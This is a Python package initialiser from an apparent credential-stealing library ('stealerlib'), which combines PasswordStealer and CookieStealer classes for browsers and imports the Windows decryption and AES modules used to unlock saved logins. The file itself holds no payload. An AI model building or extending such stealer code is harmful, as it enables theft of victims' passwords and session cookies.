#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/__init__.py
"""

import os
import json
import base64
import shutil
import sqlite3
import tempfile
import win32crypt

from Cryptodome.Cipher import AES

from .cookies import CookieStealer
from .passwords import PasswordStealer


class Browser(PasswordStealer, CookieStealer):

    def __init__(self):
        CookieStealer.__init__(self)
        PasswordStealer.__init__(self)
